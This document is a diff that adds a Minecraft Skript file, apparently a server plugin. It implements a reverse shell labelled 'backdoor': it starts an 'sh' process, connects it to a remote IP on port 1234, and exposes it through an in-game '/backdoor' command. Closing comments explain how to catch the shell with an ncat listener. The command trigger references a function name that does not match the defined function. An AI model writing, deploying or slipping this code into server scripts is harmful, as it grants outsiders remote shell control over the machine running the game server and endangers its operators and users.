@@ -1,0 +1,56 @@
+import:
+    java.lang.ProcessBuilder
+    java.net.Socket
+    java.io.InputStream
+    java.io.OutputStream
+    java.lang.Thread
+    java.lang.Runnable
+
+
+
+function backdoor():
+    set {_s} to "YOUR LOCAL IP TO CONNECT TO GOES HERE"
+    set {_p} to 1234
+
+    set {_cmd} to "sh"
+
+    set {_process} to new ProcessBuilder({_cmd}).redirectErrorStream(true).start()
+    set {_socket} to new Socket({_s}, {_p})
+
+    set {_pi} to {_process}.getInputStream()
+    set {_pe} to {_process}.getErrorStream()
+    set {_si} to {_socket}.getInputStream()
+
+    set {_po} to {_process}.getOutputStream()
+    set {_so} to {_socket}.getOutputStream()
+
+    while {_socket}.isClosed() is false:
+        while {_pi}.available() > 0:
+            {_so}.write({_pi}.read())
+        while {_pe}.available() > 0:
+            {_so}.write({_pe}.read())
+        while {_si}.available() > 0:
+            {_po}.write({_si}.read())
+
+        {_so}.flush()
+        {_po}.flush()
+        
+        Thread.sleep(50)
+
+    {_process}.destroy()
+    {_socket}.close()
+
+command /backdoor:
+    trigger:
+        set {_functions::run} to function reference "thing"
+        set {_proxy} to new proxy instance of Runnable using {_functions::*}
+        set {_x} to new Thread({_proxy})
+        {_x}.start()
+
+
+
+# on another machine run the following
+# ncat -nvlp 1234
+# then run the command in game and u have access
+
+
